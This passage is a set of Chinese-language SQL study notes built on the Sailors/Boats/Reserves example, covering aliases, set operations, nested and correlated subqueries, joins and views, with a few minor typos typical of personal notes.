<th>DAY</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>102</td>
<td>9//12</td>
</tr>
<tr>
<td>2</td>
<td>102</td>
<td>9/13</td>
</tr>
<tr>
<td>1</td>
<td>101</td>
<td>10/01</td>
</tr>
</tbody>
</table>
<p>有效合并表的SQL语句 “预订了船的水手”</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sailors.sid, Sailors.sname, Reserves.bid</span><br><span class="line"><span class="keyword">FROM</span> Sailors, Reserves</span><br><span class="line"><span class="keyword">WHERE</span> Sailors.sid <span class="operator">=</span> Reserves.sid</span><br></pre></td></tr></table></figure>
<p>合并后的表—— “预订了船的水手”</p>
<table>
<thead>
<tr>
<th>sid</th>
<th>BID</th>
<th>day</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>102</td>
<td>9/12</td>
</tr>
<tr>
<td>2</td>
<td>102</td>
<td>9/13</td>
</tr>
<tr>
<td>1</td>
<td>101</td>
<td>10/01</td>
</tr>
</tbody>
</table>
<h3 id="Column-Names-and-Table-Aliases"><a class="header-anchor" href="#Column-Names-and-Table-Aliases">¶</a>Column Names and Table Aliases</h3>
<p>原来的：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sailors.sid, Sailors.sname, Reserve.bid</span><br><span class="line"><span class="keyword">FROM</span> Sailors, Reserves</span><br><span class="line"><span class="keyword">WHERE</span> Sailors.sid <span class="operator">=</span> Reserve.sid</span><br></pre></td></tr></table></figure>
<p>改进之后：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sailors.sid, sname, bid</span><br><span class="line"><span class="keyword">FROM</span> Sailors <span class="keyword">AS</span> S, Reserves <span class="keyword">AS</span> R</span><br><span class="line"><span class="keyword">WHERE</span> S.sid <span class="operator">=</span> R.sid</span><br></pre></td></tr></table></figure>
<p>因为<code>sname</code>只有<code>Sailors</code>里面有，<code>bid</code>只有<code>Reserves</code>里面有，所以可以省略前缀，但是<code>sid</code>是两个表都有，所以需要加前缀来区分是哪个表的</p>
<p>然后给表名取别名，有助于代码精简+可读性↑</p>
<h4 id="More-Aliases"><a class="header-anchor" href="#More-Aliases">¶</a>More Aliases</h4>
<p>别名也可以在输出中使用</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> x.sname, x.age, y.sname <span class="keyword">AS</span> sname2, y.age <span class="keyword">AS</span> age2</span><br><span class="line"><span class="keyword">FROM</span> Sailors <span class="keyword">AS</span> x, Sailors <span class="keyword">AS</span> y</span><br><span class="line"><span class="keyword">WHERE</span> x.age <span class="operator">&gt;</span> y.age</span><br></pre></td></tr></table></figure>
<p>给同一个表两个别名，把一个表分成两个表，其中左表的年龄比右表大</p>
<ul>
<li>Table aliases in the FROM clause   - Needed when the same table used multiple times (“self-join”)    当同一个表被多次使用（“自连接”）的时候需要使用表别名来区分</li>
<li>Column aliases in the SELECT clause  为列指定别名，以便在查询结果中使用更有意义的列名</li>
</ul>
<h3 id="Arithmetic-Expressions"><a class="header-anchor" href="#Arithmetic-Expressions">¶</a>Arithmetic Expressions</h3>
<p>可以在``SELECT`语句中指定算术运算符和表达式</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.age, S.age <span class="operator">-</span> <span class="number">5</span> <span class="keyword">AS</span> age1, <span class="number">2</span> <span class="operator">*</span> S.ages <span class="keyword">AS</span> age2</span><br><span class="line"><span class="keyword">FROM</span> Sailors <span class="keyword">AS</span> S</span><br><span class="line"><span class="keyword">WHERE</span> S.sname <span class="operator">=</span> <span class="string">&#x27;Popeye&#x27;</span></span><br></pre></td></tr></table></figure>
<p>在``WHERE`语句中也可以使用算术运算符和表达式</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S1.sname <span class="keyword">AS</span> name1, S2.sname <span class="keyword">AS</span> name2</span><br><span class="line"><span class="keyword">FROM</span> Sailors <span class="keyword">AS</span> S1, Sailors <span class="keyword">AS</span> S2</span><br><span class="line"><span class="keyword">WHERE</span> <span class="number">2</span><span class="operator">*</span>S1.rating <span class="operator">=</span> S2.rating<span class="number">-1</span></span><br></pre></td></tr></table></figure>
<h3 id="SQL-Calculator"><a class="header-anchor" href="#SQL-Calculator">¶</a>SQL Calculator!</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">	<span class="built_in">log</span>(<span class="number">1000</span>) <span class="keyword">as</span> three,</span><br><span class="line">	<span class="built_in">exp</span>(<span class="built_in">ln</span>(<span class="number">2</span>)) <span class="keyword">as</span> two,</span><br><span class="line">	<span class="built_in">cos</span>(<span class="number">0</span>) <span class="keyword">as</span> <span class="keyword">one</span>,</span><br><span class="line">	<span class="built_in">ln</span>(<span class="number">2</span><span class="operator">*</span><span class="number">3</span>) <span class="operator">=</span> <span class="built_in">ln</span>(<span class="number">2</span>) <span class="operator">+</span> <span class="built_in">ln</span>(<span class="number">3</span>) <span class="keyword">as</span> sanity;</span><br></pre></td></tr></table></figure>
<p>没有FROM语句，且只返回一行。也可以吧SQL语言当作计算器</p>
<p>以上语句会输出一行四列的表</p>
<h3 id="String-Comparisons"><a class="header-anchor" href="#String-Comparisons">¶</a>String Comparisons</h3>
<p>SQL还支持字符串函数，特别是WHERE子句中的字符串比较函数，以下是两种不同的方式来查找格式为以B开头、且有任意数量其他字符的字符串：</p>
<ul>
<li>Old-school SQL</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.sname <span class="keyword">like</span> <span class="string">&#x27;B_%&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Standard Regular Expressions</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.sname <span class="operator">~</span> <span class="string">&#x27;B.*&#x27;</span></span><br></pre></td></tr></table></figure>
<p>好像用的是正则表达式   ~代表的是正则式匹配</p>
<h3 id="Combining-Predicates"><a class="header-anchor" href="#Combining-Predicates">¶</a>Combining Predicates</h3>
<p>使用布尔逻辑来组合多个谓词</p>
<ul>
<li>Subtle connections between:
<ul>
<li>Boolean logic in WHERE(i.e., AND, OR)</li>
<li>Traditional Set operations(i.e., INTERSECT, UNION)  传统集合操作</li>
</ul>
</li>
</ul>
<h4 id="Example1-Sid’s-of-sailors-who-reserved-a-red-or-green-boat"><a class="header-anchor" href="#Example1-Sid’s-of-sailors-who-reserved-a-red-or-green-boat">¶</a>Example1: Sid’s of sailors who reserved a red or green boat</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> (B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span> <span class="keyword">OR</span> B.color <span class="operator">=</span> <span class="string">&#x27;green&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>另一种方式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;green&#x27;</span></span><br></pre></td></tr></table></figure>
<p><code>UNION ALL</code>    不移除重复项，相当于取并集，红or绿</p>
<h4 id="Example2-Sid’s-of-sailors-who-reserved-a-red-and-green-boat"><a class="header-anchor" href="#Example2-Sid’s-of-sailors-who-reserved-a-red-and-green-boat">¶</a>Example2: Sid’s of sailors who reserved a red and green boat</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> (B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span> <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;green&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>但是此处第一种方式将不会返回任何东西，因为<code>color</code>不可能同时<code>='red'</code> 且<code>='green'</code></p>
<p>所以此处只能使用另一种方式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">INTERSECT</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;green&#x27;</span></span><br></pre></td></tr></table></figure>
<p><code>INTERSECT</code>   相当于取交集，红and绿</p>
<h3 id="Set-Semantics"><a class="header-anchor" href="#Set-Semantics">¶</a>Set Semantics</h3>
<ul>
<li>Set: a collection of distinct elements    集合是由不同元素组成的集合</li>
<li>Standard ways of manipulating / combining sets
<ul>
<li>Union  并集</li>
<li>Intersect   交集</li>
<li>Except   差集</li>
</ul>
</li>
<li>Treat tuples within a relation as elements of a set   将关系中的元组视为集合中的元素</li>
</ul>
<h4 id="Default-Set-Semantics"><a class="header-anchor" href="#Default-Set-Semantics">¶</a>Default: Set Semantics</h4>
<p><code>R = &#123;A, A, A, A, B, B, C, D&#125;</code></p>
<p><code>S = &#123;A, A, B, B, B, C, E&#125;</code></p>
<ul>
<li><code>UNION &#123;A, B, C, D, E&#125;</code></li>
<li><code>INTERSECT &#123;A, B, C&#125;</code></li>
<li><code>EXCEPT &#123;D&#125;</code></li>
</ul>
<p>Note: Think of each other as being a tuple in relation</p>
<h4 id="“ALL”-Multiset-Semantics"><a class="header-anchor" href="#“ALL”-Multiset-Semantics">¶</a>“ALL”: Multiset Semantics</h4>
<p><code>R = &#123;A, A, A, A, B, B, C, D&#125; = &#123;A(4), B(2), C(1), D(1)&#125;</code></p>
<p><code>S = &#123;A, A, B, B, B, C, E&#125; = &#123;A(2), B(3), C(1), E(1)&#125;</code></p>
<ul>
<li><code>UNION ALL: sum of cardinalities</code>    <code>&#123;A(4+2), B(2+3), C(1+1), D(1+0), E(0+1)&#125; = &#123;A, A, A, A, A, A, B, B, B, B, B, C, C, D, E&#125;</code></li>
<li><code>INTERSECT ALL: min of cardinalities</code>   <code>&#123;A(min(4, 2)), B(min(2, 3)), C(min(1, 1)), D(min(1, 0)), E(min(0, 1))&#125; = &#123;A, A, B, B, C&#125;</code></li>
<li><code>EXCEPT ALL: difference of cardinalities</code>   <code>&#123;A(4-2), B(2-3), C(1-1), D(1-0), E(0-1)&#125; = &#123;A, A, D&#125;</code></li>
</ul>
<h3 id="Nested-Queries"><a class="header-anchor" href="#Nested-Queries">¶</a>Nested Queries</h3>
<ul>
<li><code>嵌套查找</code></li>
</ul>
<h4 id="Nested-Queries-IN"><a class="header-anchor" href="#Nested-Queries-IN">¶</a>Nested Queries: IN</h4>
<ul>
<li>Example: Names of sailors who’ve reserved boat #102:</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.sid <span class="keyword">IN</span></span><br><span class="line">	(<span class="keyword">SELECT</span> R.sid</span><br><span class="line">     <span class="keyword">FROM</span> Reserves R</span><br><span class="line">    <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> <span class="number">102</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>括号里的是<code>subquery</code></li>
</ul>
<h4 id="Nested-Queries-NOT-IN"><a class="header-anchor" href="#Nested-Queries-NOT-IN">¶</a>Nested Queries: NOT IN</h4>
<ul>
<li>Example: Names of sailors who’ve not reserved boat #103:</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.sid <span class="keyword">NOT</span> <span class="keyword">IN</span></span><br><span class="line">	(<span class="keyword">SELECT</span> R.sid</span><br><span class="line">     <span class="keyword">FROM</span> Reserves R</span><br><span class="line">    <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> <span class="number">103</span>)</span><br></pre></td></tr></table></figure>
<h4 id="Nested-Queries-EXISTS"><a class="header-anchor" href="#Nested-Queries-EXISTS">¶</a>Nested Queries: EXISTS</h4>
<ul>
<li>This is a bit odd, but it is legal:</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span></span><br><span class="line">	(<span class="keyword">SELECT</span> R.sid</span><br><span class="line">    <span class="keyword">FROM</span> Reserves R</span><br><span class="line">    <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> <span class="number">103</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>如果subquery有东西返回，就输出其中所有的sname，如果subquery返回为空，则query输出也为空</li>
</ul>
<h4 id="Nested-Queries-with-Correlation"><a class="header-anchor" href="#Nested-Queries-with-Correlation">¶</a>Nested Queries with Correlation</h4>
<ul>
<li>相关子查询</li>
<li>Names of sailors who 've reserved boat #102:</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span></span><br><span class="line">	(<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">    <span class="keyword">FROM</span> Reserves R</span><br><span class="line">    <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> <span class="number">102</span> <span class="keyword">AND</span> S.sid <span class="operator">=</span> R.sid)</span><br></pre></td></tr></table></figure>
<ul>
<li>Correlated subquery is recomputed for each Sailors tuple   相关子查询针对每个Sailors元组（元组代表表中的一行 记录）重新计算</li>
<li>这个相关子查询有点像函数</li>
</ul>
<h4 id="More-on-Set-Comparison-Operators"><a class="header-anchor" href="#More-on-Set-Comparison-Operators">¶</a>More on Set-Comparison Operators</h4>
<ul>
<li>We 've seen: <code>IN</code>  <code>EXISTS</code></li>
<li>Can also have: <code>NOT</code>  <code>IN</code>  <code>NOT EXISTS</code></li>
<li>Other forms: <code>op ANY</code>  <code>op ALL</code></li>
</ul>
<h5 id="Example-Find-sailors-whose-rating-is-greater-than-that-of-some-sailor-called-Popeye"><a class="header-anchor" href="#Example-Find-sailors-whose-rating-is-greater-than-that-of-some-sailor-called-Popeye">¶</a>Example: Find sailors whose rating is greater than that of some sailor called Popeye</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.rating <span class="operator">&gt;</span> <span class="keyword">ANY</span></span><br><span class="line">	(<span class="keyword">SELECT</span> S2.rating</span><br><span class="line">    <span class="keyword">FROM</span> Sailors S2</span><br><span class="line">    <span class="keyword">WHERE</span> S2.sname <span class="operator">=</span> <span class="string">&#x27;Popeye&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>从Sailors表中，找出比Popeye的rating更高的人，输出其所有信息</li>
</ul>
<h3 id="A-Tough-One-“Division”——Relational-Division"><a class="header-anchor" href="#A-Tough-One-“Division”——Relational-Division">¶</a>A Tough One: “Division”——Relational Division</h3>
<ul>
<li>Relational Division: “Find sailors who 've reserved all boats.”     Said differently: “sailors with no counterexample missing boats”      关系除法：“找出预订了所有船只的水手。”      以下有点像双重否定之后输出了正确的结果</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span></span><br><span class="line">	(<span class="keyword">SELECT</span> B.bid</span><br><span class="line">    <span class="keyword">FROM</span> Boats B</span><br><span class="line">    <span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> (<span class="keyword">SELECT</span> R.bid</span><br><span class="line">                     <span class="keyword">FROM</span> Reserves R</span><br><span class="line">                     <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid</span><br><span class="line">                     <span class="keyword">AND</span> R.sid <span class="operator">=</span> S.sid))</span><br></pre></td></tr></table></figure>
<h3 id="ARGMAX？这块没太懂"><a class="header-anchor" href="#ARGMAX？这块没太懂">¶</a>ARGMAX？这块没太懂</h3>
<h4 id="Pt-1"><a class="header-anchor" href="#Pt-1">¶</a>Pt 1</h4>
<ul>
<li>The sailor with the highest rating</li>
<li>Correct or Incorrect?</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">MAX</span>(S.rating)</span><br><span class="line"><span class="keyword">FROM</span> Sailors S;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> S.<span class="operator">*</span>, <span class="built_in">MAX</span>(S.rating)</span><br><span class="line"><span class="keyword">FROM</span> Sailors S;</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个写法不对，因为只输出的最大值，而没有输出最大值对应的水手的姓名等信息</li>
<li>第二个写法有S.* ，包含了S的所有列，包括姓名、ID、最大值等。但是第二个写法是非法的，该查询会被拒绝。因为不知道该输出哪个水手的信息</li>
<li>MAX是一个聚合函数，必须与GROUP NY子句一起使用，或者在子查询中使用，而不能直接与单个记录的列一起选择（？</li>
</ul>
<h4 id="Pt-2"><a class="header-anchor" href="#Pt-2">¶</a>Pt 2</h4>
<p>以下两个query的结果一致，都是输出rating最大值的水手的信息</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.rating <span class="operator">&gt;=</span> <span class="keyword">ALL</span></span><br><span class="line">	(<span class="keyword">SELECT</span> S2.rating</span><br><span class="line">    <span class="keyword">FROM</span> Sailors S2)</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> rating <span class="keyword">DESC</span></span><br><span class="line">LIMIT <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>第一种写法可能会返回一大堆评级为最高级的水手信息，相比之下第二种写法只会返回一种水手信息</p>
<h3 id="“Inner”-Joins-Another-Syntax"><a class="header-anchor" href="#“Inner”-Joins-Another-Syntax">¶</a>“Inner” Joins: Another Syntax</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> s.<span class="operator">*</span>, r.bid</span><br><span class="line"><span class="keyword">FROM</span> Sailors s, Reserves r</span><br><span class="line"><span class="keyword">WHERE</span> s.sid <span class="operator">=</span> r.sid</span><br><span class="line"><span class="keyword">AND</span> ...</span><br></pre></td></tr></table></figure>
<p>以上是第一种写法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> s.<span class="operator">*</span>, r.bid</span><br><span class="line"><span class="keyword">FROM</span> Sailors s <span class="keyword">INNER</span> <span class="keyword">JOIN</span> Reserves r</span><br><span class="line"><span class="keyword">ON</span> s.sid <span class="operator">=</span> r.sid</span><br><span class="line"><span class="keyword">WHERE</span> ...</span><br></pre></td></tr></table></figure>
<p>以上是第二种写法，两种写法的效果一样</p>
<p><code>Inner Join</code>是一种中缀表示法，位于两个表的名称之间，用于两个表联接</p>
<h3 id="Join-Variants"><a class="header-anchor" href="#Join-Variants">¶</a>Join Variants</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">&lt;</span><span class="keyword">column</span> expression list<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"> [<span class="keyword">INNER</span> <span class="operator">|</span> <span class="keyword">NATURAL</span></span><br><span class="line"> 	<span class="operator">|</span> &#123;<span class="keyword">LEFT</span> <span class="operator">|</span> <span class="keyword">RIGHT</span> <span class="operator">|</span> <span class="keyword">FULL</span> &#125; &#123;<span class="keyword">OUTER</span>&#125;] <span class="keyword">JOIN</span></span><br><span class="line"> 	table_name</span><br><span class="line"> 	<span class="keyword">ON</span> <span class="operator">&lt;</span>qualification list<span class="operator">&gt;</span></span><br><span class="line"> <span class="keyword">WHERE</span> ...</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>INNER is default    默认为内部连接</p>
</li>
<li>
<p>Inner join what we 've learned so far  -Same thing, just with different syntax</p>
</li>
</ul>
<h4 id="Inner-Natural-Joins"><a class="header-anchor" href="#Inner-Natural-Joins">¶</a>Inner/Natural Joins</h4>
<ul>
<li>
<p>内部连接/自然连接</p>
</li>
<li>
<p>以下三种写法等效</p>
</li>
<li>
<p>第一种：最开始的两表联合查询</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> s.sid, s.sname, r.bid</span><br><span class="line"><span class="keyword">FROM</span> Sailors s, Reserves r</span><br><span class="line"><span class="keyword">WHERE</span> s.sid <span class="operator">=</span> r.sid</span><br><span class="line"> <span class="keyword">AND</span> s.age <span class="operator">&gt;</span> <span class="number">20</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第二种：Inner Join</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> s.sid, s.sname, r.bid</span><br><span class="line"><span class="keyword">FROM</span> Sailors s <span class="keyword">INNER</span> <span class="keyword">JOIN</span> Reserves r</span><br><span class="line"><span class="keyword">ON</span> s.sid <span class="operator">=</span> r.sid</span><br><span class="line"> <span class="keyword">WHERE</span> s.age <span class="operator">&gt;</span> <span class="number">20</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第三种：Natural Join</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> s.sid, s.sname, r.bid</span><br><span class="line"><span class="keyword">FROM</span> Sailors s <span class="keyword">NATURAL</span> <span class="keyword">JOIN</span> Reserves r</span><br><span class="line"><span class="keyword">WHERE</span> s.age <span class="operator">&gt;</span> <span class="number">20</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>&quot;NATURAL&quot;</code> means equi-join for pairs of attributes with the same name</li>
<li><code>Natural Join</code> 是``Inner Join<code>的一种特殊情况，</code>Natural Join<code>的</code>on<code>子句在后台被自动计算，自动匹配相等的列名称，也就是第二种写法中的</code>s.sid = r.sid`</li>
<li>所以<em>谨慎选择使用<code>natural join</code></em>，因为这种方法会选择联合的表中<strong>所有列名称相同</strong>的匹配字段；而且随着向表中添加或删除列或重命名列，``natural join`会以不可预测的方式中断，所以一般不推荐使用</li>
</ul>
<h4 id="Left-Outer-Join"><a class="header-anchor" href="#Left-Outer-Join">¶</a>Left Outer Join</h4>
<ul>
<li>returns all matched rows, and preserves all unmatched rows from the table on the left of the join clause    -(use nulls in fields of non-matching tuples)   返回所有匹配的行，并保留连接子句左侧表中未匹配的所有行  （在不匹配元组的字段中使用空值）</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> s.sid, s.sname, r.bid</span><br><span class="line"><span class="keyword">FROM</span> Sailors2 s <span class="keyword">LEFT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> Reserves2 r</span><br><span class="line"><span class="keyword">On</span> s.sid <span class="operator">=</span> r.sid;</span><br></pre></td></tr></table></figure>
<ul>
<li>returns all sailors &amp; bid for boat in any of their reservations   返回了所有水手及其在<code>Reserves</code>中的船只编号<code>r.bid</code></li>
<li>note: no match for s.sid? r.bid IS NULL  如果<code>s.sid</code>没有匹配项则<code>r.bid = NULL</code>     结果集将包含左侧表的所有记录，以及右侧表中对应的记录</li>
</ul>
<h4 id="Right-Outer-Join"><a class="header-anchor" href="#Right-Outer-Join">¶</a>Right Outer Join</h4>
<ul>
<li>returns all matched rows, and preserves all unmatched rows from the table on the rightof the join clause    -(use nulls in fields of non-matching tuples)   返回所有匹配的行，并保留连接子句右侧表中未匹配的所有行  （在不匹配元组的字段中使用空值）</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> r.sid, b.bid, b.bname</span><br><span class="line"><span class="keyword">FROM</span> Reserves2 r <span class="keyword">RIGHT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> Boats2 b</span><br><span class="line"><span class="keyword">On</span> r.bid <span class="operator">=</span> b.bid</span><br></pre></td></tr></table></figure>
<ul>
<li>returns all boats&amp; sid for any sailor associated with the reservation   返回了所有水手及其在<code>Reserves</code>中的船只编号<code>r.bid</code></li>
<li>note: no match for s.sid? r.bid IS NULL  如果<code>s.sid</code>没有匹配项则<code>r.bid = NULL</code>     结果集将包含右侧表的所有记录，以及左侧表中对应的记录</li>
</ul>
<h4 id="Full-Outer-Join"><a class="header-anchor" href="#Full-Outer-Join">¶</a>Full Outer Join</h4>
<ul>
<li>Returns all (matched or unmatched) rows from the tables on both sides of the join clause    返回连接子句两侧表中的所有行（不管匹不匹配）</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> r.sid, b.bid, b.bname</span><br><span class="line"><span class="keyword">FROM</span> Reserves2 r <span class="keyword">FULL</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> Boats2 b</span><br><span class="line"><span class="keyword">ON</span> r.bid <span class="operator">=</span> b.bid</span><br></pre></td></tr></table></figure>
<ul>
<li>returns all boats &amp; all information on reservations   返回左右表所有信息    此处即所有船只和所有预订信息</li>
<li>No match for r.bid?  - b.bid IS NULL AND b.bname IS NULL   如果<code>r.bid没有匹配项？</code> 则 <code>b.bid</code> 和 <code>b.bname</code> 都是<code>NULL</code></li>
<li>No match for b.bid?  - <code>r.sid</code> IS NULL</li>
</ul>
<h3 id="Views-Named-Queries"><a class="header-anchor" href="#Views-Named-Queries">¶</a>Views: Named Queries</h3>
<ul>
<li>视图是一个虚拟的表，其内容由SQL查询定义。视图不存储数据，而是在查询视图时动态生成数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> view_name   <span class="operator">/</span><span class="operator">/</span> 创建视图</span><br><span class="line"><span class="keyword">AS</span> select_statement     <span class="operator">/</span><span class="operator">/</span> 定义视图内容</span><br></pre></td></tr></table></figure>
<ul>
<li>Makes development simpler   简化复杂的查询，通过简单的视图名称来代替复杂的SQL语句</li>
<li>Often used for security  视图可以限制用户对某些数据的访问，隐藏其余数据</li>
<li>Not “materialized”   非物化，即视图不存储查询结果，每次访问视图时都会执行底层的SQL查询</li>
<li>应用场景：数据聚合、数据过滤、简化复杂查询等</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> Redcount</span><br><span class="line"><span class="keyword">AS</span> <span class="keyword">SELECT</span> B.bid, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> scount</span><br><span class="line">	<span class="keyword">FROM</span> Boats2 B, Reserves2 R</span><br><span class="line">	<span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line">	<span class="keyword">GROUP</span> <span class="keyword">BY</span> B.bid</span><br></pre></td></tr></table></figure>
<ul>
<li><code>Redcount</code>视图通过查询<code>Boats2</code>和<code>Reserves2</code>表，统计了颜色为红色的船只的预订数量，并按船只编号分组。如果<code>B.bid</code>在<code>Reserves2</code>表中没有匹配项，那么对应的计数将为0</li>
</ul>
<h4 id="Views-Instead-of-Relations-in-Queries-这个没太懂"><a class="header-anchor" href="#Views-Instead-of-Relations-in-Queries-这个没太懂">¶</a>Views Instead of Relations in Queries   这个没太懂</h4>
